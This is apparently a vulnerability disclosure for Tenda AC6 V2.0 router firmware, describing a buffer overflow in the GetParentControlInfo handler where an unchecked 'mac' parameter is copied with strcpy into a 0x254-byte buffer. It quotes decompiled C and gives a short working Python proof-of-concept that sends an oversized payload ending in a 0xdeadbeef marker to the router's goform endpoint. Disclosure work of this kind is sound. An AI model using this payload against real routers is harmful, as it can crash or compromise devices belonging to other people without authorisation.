# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "GetParentControlInfo"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/102855)

在GetParentControlInfo函数中，通过websGetVar获得用户输入的mac，并未对其进行输入验证，直接使用strcpy写入pc_info->mac_addr,而pc_info通过malloc创建的空间只有0x254大小。因此会造成溢出。

```c
mac_addr = websGetVar(wp, "mac", byte_519A28);//get mac value
pc_info = (parent_control_info *)malloc(0x254u);
memset(pc_info, 0, sizeof(parent_control_info));
strcpy((char *)pc_info->mac_addr, mac_addr);//overflow
```

![image-20250614161657528](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614161657528.png)

poc

```python
import requests
def send_payload(url, payload):
    params={'mac':payload}
    response = requests.get(url, params=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2048+b"\xef\xbe\xad\xde"
url="http://192.168.1.1/goform/GetParentControlInfo"
send_payload(url, payload)   
```

![image-20250614171717338](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614171717338.png)

